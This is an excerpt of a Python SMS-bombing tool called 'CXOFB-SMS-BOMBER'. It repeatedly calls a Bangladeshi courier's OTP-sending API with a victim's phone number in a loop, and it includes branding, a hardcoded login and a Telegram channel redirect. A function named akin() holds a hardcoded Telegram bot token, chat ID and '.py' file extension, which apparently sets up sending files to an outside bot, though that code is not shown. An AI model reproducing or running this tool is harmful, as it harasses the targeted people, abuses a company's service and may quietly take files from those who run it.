...
| $$    $$ /$$/\  $$| $$  | $$| $$      | $$  \ $$       /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$  | $$| $$  \ $$
|  $$$$$$/| $$  \ $$|  $$$$$$/| $$      | $$$$$$$/      |  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$  | $$| $$  | $$
 \______/ |__/  |__/ \______/ |__/      |_______/        \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |__/  |__/|__/  |__/
...
\033[1;32m[-] m CXOFB ONWER MR-X 
\033[1;32m[-] GITHUB    :\033[1;32m CYBER X OF BANGLADESH
\033[1;32m[-] TELIGRAM  :\033[1;32m CYBER X OF BANGLADESH
...
def akin():
	bot_token = ('6861251314:AAEz8kpPLLaZH8j_2dfMHlfQXFdJFVDxh-c')
	chat_id = ('5386125511')
	extension = ('.py')
...
rp= 'CYBER X OF BANGLADESH'
x = 'CYBER X OF BANGLADESH'
if 'CYBER X OF BANGLADESH'==user and 'CYBER X OF BANGLADESH'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL JOIN MY TELIGRAM CHENNEL ")
else:
...
url1 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile="+number
...
os.system("xdg-open https://t.me/+B20czXBhs9Q1YTY1")
print (logo)
print(f"""\n{ran}\033[1;31m                                                               
\t\033[1;32m                 
\t\033[1;32m                
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥CXOFB-SMS-BOMBER🔥 "+w+tim)
